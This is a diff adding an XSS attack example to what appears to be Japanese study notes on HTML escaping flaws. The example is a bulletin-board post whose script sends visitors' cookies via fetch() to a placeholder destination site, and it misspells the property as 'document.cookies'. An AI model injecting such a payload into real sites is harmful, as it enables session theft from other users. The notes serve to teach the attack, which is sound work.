@@ -174,6 +174,19 @@ WebアプリによるHTML出力のエスケープ処理の欠陥を悪用し、�
 
 #### ▼ 攻撃例
 
+例えば、複数人が使用する掲示板アプリで、悪意のある人が以下のような投稿をしたとする。
+
+```javascript
+<body>
+    <p>今日の気分は<script>fetch('https://<Cookieの送信先サイト>/?cookie_data='+document.cookies);</script>だよ</p>
+</body>
+```
+
+他の人が掲示板アプリを開くと、上記の投稿内のスクリプトが実行される。
+
+スクリプトは、Cookieをサイトに送信する。
+
+> - https://zenn.dev/oreo2990/articles/d33a264b2d8b4c
 > - https://www.tohoho-web.com/ex/xss.html
 
 <br>
